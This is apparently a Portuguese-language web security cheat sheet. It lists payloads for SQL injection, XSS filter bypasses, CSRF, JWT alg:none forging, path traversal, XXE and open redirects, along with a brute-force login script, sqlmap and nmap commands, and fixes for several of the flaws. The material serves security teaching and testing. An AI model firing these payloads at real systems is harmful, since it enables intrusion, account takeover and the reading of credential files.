# Padrões de Ataque — Payloads e Vetores Reais

## SQL Injection

### Payloads de teste

```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin' #
' OR 1=1--
'; DROP TABLE users; --
' UNION SELECT null,username,password FROM users--
' UNION SELECT null,table_name,null FROM information_schema.tables--
1' AND SLEEP(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### SQLi por tipo de banco

```sql
-- MySQL
' AND SUBSTRING(version(),1,1)='5
' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' UNION SELECT null,current_database(),null--

-- SQLite
' UNION SELECT null,sqlite_version(),null--
```

### Detectar blind SQLi

```
# Se a página demora 5+ segundos, é vulnerável a time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--  (SQL Server)
' AND 1=(SELECT 1 FROM pg_sleep(5))--  (PostgreSQL)
```

---

## XSS (Cross-Site Scripting)

### Payloads básicos

```html
<script>
  alert("XSS");
</script>
<script>
  alert(document.cookie);
</script>
<img src="x" onerror="alert(1)" />
<svg onload="alert(1)">
  <body onload="alert(1)">
    javascript:alert(1)
  </body>
</svg>
```

### Bypass de filtros

```html
<!-- Bypass de maiúsculas/minúsculas -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- Bypass de aspas -->
<img src=x onerror=alert`1`>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Sem parênteses -->
<img src=1 onerror=alert;>
<svg/onload=alert(1)>

<!-- DOM-based XSS -->
# URL: https://site.com/#<script>alert(1)</script>
# Se o JS faz: document.innerHTML = location.hash → vulnerável
```

### XSS armazenado vs refletido

```
Refletido: payload na URL → imediato, não persiste
Armazenado: payload salvo no banco → afeta todos os usuários
DOM-based: manipulação do DOM via JS client-side
```

---

## CSRF (Cross-Site Request Forgery)

### Como funciona

```html
<!-- Site malicioso que força o usuário logado a fazer uma ação -->
<img
  src="https://banco.com/transferir?valor=1000&para=atacante"
  style="display:none"
/>

<!-- Ou via formulário oculto -->
<form action="https://app.com/mudar-senha" method="POST" id="f">
  <input name="nova_senha" value="hacked123" />
</form>
<script>
  document.getElementById("f").submit();
</script>
```

### Como verificar se está vulnerável

1. Faça login na aplicação
2. Capture um request POST legítimo
3. Reproduza o request de outro domínio ou via curl sem o cookie CSRF
4. Se funcionar → vulnerável

```bash
# Teste via curl
curl -X POST https://app.com/mudar-email \
  -H "Cookie: session=abc123" \
  -d "novo_email=hacker@evil.com"
# Se mudar o email → CSRF vulnerável
```

---

## Força Bruta e Enumeração

### Ataque de força bruta em login

```python
# Simulação de ataque
import requests

passwords = ['123456', 'password', 'admin', 'qwerty', '12345678']
for pwd in passwords:
    r = requests.post('https://app.com/login',
                      json={'email': 'admin@app.com', 'password': pwd})
    if r.status_code == 200:
        print(f"Senha encontrada: {pwd}")
        break
```

### Enumeração de usuários

```bash
# Resposta diferente para usuário inexistente vs senha errada = vazamento de informação
curl -X POST /login -d "email=admin@app.com&senha=errada"
# → "Senha incorreta"  ← confirma que o email existe!

curl -X POST /login -d "email=naoexiste@app.com&senha=errada"
# → "Email não encontrado"  ← vaza que o email não existe

# Solução: sempre retornar "Credenciais inválidas" para ambos os casos
```

### Enumeração de IDs

```bash
# IDOR discovery
for i in $(seq 1 100); do
  curl -s "https://app.com/api/usuario/$i" \
    -H "Authorization: Bearer $TOKEN"
done
```

---

## JWT Attacks

### Algoritmo none

```python
# Payload JWT com alg:none (bypassa assinatura)
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."  # sem assinatura
```

### Brute force do secret

```bash
# Se o secret for fraco, pode ser descoberto
pip install jwt-cracker
jwt-cracker -t eyJhbG... -w wordlist.txt

# Ou com hashcat
hashcat -a 0 -m 16500 token.txt wordlist.txt
```

### Verificar vulnerabilidades JWT

```python
import jwt

# ✅ Sempre especifique algorithms= para evitar alg:none
try:
    payload = jwt.decode(token, SECRET, algorithms=['HS256'])  # NÃO use algorithms='auto'
except jwt.ExpiredSignatureError:
    return {"error": "Token expirado"}, 401
except jwt.InvalidTokenError:
    return {"error": "Token inválido"}, 401
```

---

## Path Traversal

### Payloads

```
../../etc/passwd
../../../etc/shadow
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//etc/passwd
..././..././etc/passwd

# Windows
..\..\Windows\System32\drivers\etc\hosts
..\..\..\boot.ini
```

### Teste

```bash
curl "https://app.com/download?file=../../etc/passwd"
curl "https://app.com/download?file=..%2F..%2Fetc%2Fpasswd"
```

### Correção

```python
import os

UPLOAD_DIR = '/var/app/uploads'

@app.route('/download')
def download():
    filename = request.args.get('file')

    # ✅ Normalizar e verificar que está dentro do diretório permitido
    filepath = os.path.realpath(os.path.join(UPLOAD_DIR, filename))

    if not filepath.startswith(UPLOAD_DIR):
        abort(400)  # tentativa de path traversal

    if not os.path.exists(filepath):
        abort(404)

    return send_file(filepath)
```

---

## XXE (XML External Entity)

### Payload de ataque

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Correção (Python)

```python
# ❌ VULNERÁVEL
import xml.etree.ElementTree as ET
tree = ET.parse(xml_file)  # vulnerável a XXE em versões antigas

# ✅ CORRIGIDO
from defusedxml import ElementTree as ET
tree = ET.parse(xml_file)  # pip install defusedxml
```

---

## Open Redirect

### Teste

```
https://app.com/login?next=https://evil.com
https://app.com/redirect?url=//evil.com
https://app.com/logout?redirect=javascript:alert(1)
```

### Correção

```python
from urllib.parse import urlparse, urljoin

def is_safe_redirect(url):
    """Verifica se o redirect é para o mesmo domínio."""
    host_url = urlparse(request.host_url)
    redirect_url = urlparse(urljoin(request.host_url, url))
    return (redirect_url.scheme in ('http', 'https') and
            host_url.netloc == redirect_url.netloc)

@app.route('/login')
def login():
    next_url = request.args.get('next', '/')
    if not is_safe_redirect(next_url):
        next_url = '/'  # redirect seguro padrão
    return redirect(next_url)
```

---

## Clickjacking

### Teste

```html
<!-- Tente embedar sua aplicação em um iframe externo -->
<iframe src="https://app.com/admin"></iframe>
<!-- Se aparecer → vulnerável a clickjacking -->
```

### Correção

```python
# Header para bloquear iframes
response.headers['X-Frame-Options'] = 'DENY'
# ou
response.headers['X-Frame-Options'] = 'SAMEORIGIN'  # permite apenas mesmo domínio

# CSP moderno (substitui X-Frame-Options)
response.headers['Content-Security-Policy'] = "frame-ancestors 'none'"
```

---

## Insecure Deserialization

### Python (pickle)

```python
# ❌ EXTREMAMENTE PERIGOSO — nunca deserializar dados não confiáveis com pickle
import pickle
data = pickle.loads(user_input)  # executa código arbitrário!

# ✅ Use JSON para dados externos
import json
data = json.loads(user_input)  # seguro
```

### Node.js (node-serialize)

```javascript
// ❌ VULNERÁVEL
const serialize = require("node-serialize");
const obj = serialize.unserialize(req.body.data); // RCE!

// ✅ Use JSON
const obj = JSON.parse(req.body.data);
```

---

## Scanning Automatizado — Comandos

```bash
# Bandit (Python) — análise estática
pip install bandit
bandit -r ./projeto -f json -o bandit_results.json

# Semgrep — análise multi-linguagem
pip install semgrep
semgrep --config=auto ./projeto --json > semgrep_results.json
semgrep --config=p/owasp-top-ten ./projeto

# Safety (dependências Python)
pip install safety
safety check

# npm audit (Node.js)
npm audit --json > npm_audit.json

# Nmap (portas abertas)
nmap -sV -sC -p- localhost

# SQLMap (SQL Injection automatizado — apenas em ambientes de teste!)
sqlmap -u "http://localhost/login" --data="email=test&password=test" --level=3
```
